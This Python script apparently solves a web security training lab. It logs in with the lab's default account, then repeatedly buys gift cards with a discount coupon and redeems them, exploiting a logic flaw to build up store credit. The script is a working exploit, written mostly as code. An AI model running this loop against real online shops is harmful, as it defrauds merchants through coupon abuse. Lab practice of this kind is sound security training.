import requests
import re




# Disable certificate warnings
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

session = requests.Session()

# Use Burp proxy if needed
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# Take URL input

app_url = input("Enter your url :  ").strip()

# To find the csrf token from url 

csrf_token = session.get(app_url+"/login",verify=False,proxies=proxies)
token = re.search(r'name="csrf" value="(.*?)"',csrf_token.text).group(1)
print(f"csrf token of /login {token}")



# Now we are going to login to the application 

data = {"username":"wiener","password":"peter","csrf":token}

wiener_login = session.post(app_url+"/login",verify=False,proxies=proxies,data=data)

# coupon code SIGNUP30

#coupon_code = ["SIGNUP30"]

# adding gift card 

add_gift_card = {"productId":"2","redir":"PRODUCT","quantity":"1"}
add_card = session.post(app_url+"/cart",verify=False,proxies=proxies,data=add_gift_card)

# now find the csrf token again from /cart becuase its referesh every time

while True:
    # 1. Add product to cart
    add_gift_card = {"productId":"2","redir":"PRODUCT","quantity":"1"}
    session.post(app_url+"/cart", verify=False, proxies=proxies, data=add_gift_card)

    # 2. Get fresh CSRF token from /cart page
    cart_page = session.get(app_url+"/cart", verify=False, proxies=proxies)
    token = re.search(r'name="csrf" value="(.*?)"', cart_page.text).group(1)

    # 3. Apply coupon with fresh token
    coupon_data = {"csrf": token, "coupon": "SIGNUP30"}
    session.post(app_url+"/cart/coupon", verify=False, proxies=proxies, data=coupon_data)

    # 4. Get fresh CSRF token again from /cart for checkout
    cart_page = session.get(app_url+"/cart", verify=False, proxies=proxies)
    token = re.search(r'name="csrf" value="(.*?)"', cart_page.text).group(1)

    # 5. Checkout with fresh token
    checkout_resp = session.post(app_url+"/cart/checkout", verify=False, proxies=proxies, data={"csrf": token})

    # 6. Extract gift card code from checkout response (use safer regex)
    match = re.search(r'<th>Code</th>.*?<td>([A-Za-z0-9]{10})</td>', checkout_resp.text, re.DOTALL)
    if not match:
        print("No gift card code found!")
        break
    gift_card_code = match.group(1)
    print(f"Gift card code: {gift_card_code}")

    # 7. Get fresh CSRF token from /my-account for redeeming gift card
    my_account = session.get(app_url+f"/my-account?id=wiener", verify=False, proxies=proxies)
    token = re.search(r'name="csrf" value="(.*?)"', my_account.text).group(1)

    # 8. Redeem gift card
    redeem_data = {"csrf": token, "gift-card": gift_card_code}
    redeem_resp = session.post(app_url+"/gift-card", verify=False, proxies=proxies, data=redeem_data)

    # 9. Check if enough store credit is reached
    
    store_credit_match = re.search(r'Store credit: \$([0-9]+\.[0-9]{2})', redeem_resp.text) 
    # [0-9]+ → one or more digits (dollar part),\. → literal decimal point,[0-9]{2} → exactly two digits (cents),he dollar sign ($) is a special character in regex, so we escape it with a backslash.
    
    if store_credit_match:
        store_credit = float(store_credit_match.group(1))
    print(f"Current store credit: ${store_credit}")

    if store_credit >= 1337.00:
        print("Enough money added!")
        break  # in a real loop, you'd break here
    else:
        print("Keep going, not enough money yet.")
else:
    print("Store credit not found.")

    
    
    
data_2 = {"productId":"1","redir":"PRODUCT","quantity":"1"}
login_session = session.post(app_url+"/cart",verify=False,proxies=proxies,data=data_2)
login_session2 = session.post(app_url+"/cart/checkout",verify=False,proxies=proxies,data={"csrf":token})



# i have only issue with crate a regex rest all thing is good and their i have no question 
